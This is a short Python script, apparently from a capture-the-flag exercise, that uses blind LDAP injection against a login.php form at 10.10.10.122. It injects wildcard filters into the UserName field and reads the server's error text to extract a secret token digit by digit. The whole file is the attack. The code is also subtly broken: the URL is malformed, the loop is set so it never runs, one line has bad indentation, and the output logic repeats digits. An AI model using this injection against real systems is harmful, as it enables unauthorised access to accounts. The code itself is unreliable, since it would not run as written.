#!/usr/bin/python3

#code to find toke which is 81 chras long using ldap injection.
import requests

from time import sleep
from string import digits,ascii_lowercase
import sys

print(digits)
print(ascii_lowercase)
attribute="pager"

token=""
url='http:10.10.10.122/login.php'
loop=0

while loop > 0:
    for digit in digits:#its gonna loop through each number
        token=token #set it to nothing
        query=f'ldapuser%29%29{attribute}%3d{token}{digit}%2a' #  %---> is going to be automatically double url encoded by our requests 29---->)  %3d--->= %2a--->*(wildcard)
                                                                #%------>percentage url encoded is %25
                #ldapuser))(pager)=<token>*
        proxy={'http':'localhost:8080'}
        data={'UserName':query,"OTP":"1234"}
        r=requests.post(url,data=data,proxies=proxy)
        if 'cannot login' in r.text:
            token=token + digit #it's treating everething as string so not gonna do math just like print(f"username"+"surname")
            #print("Success: {token}")
             sys.stdout.write(f"\rToken:{token}{digit}") #\r to do a line (its gonna overwriting what's printing and tell us what digit it's working on)
            break
        elif digit == "9":#this is a string now If we hit 9 then we dont find a match then scripts done
            loop=0
            break

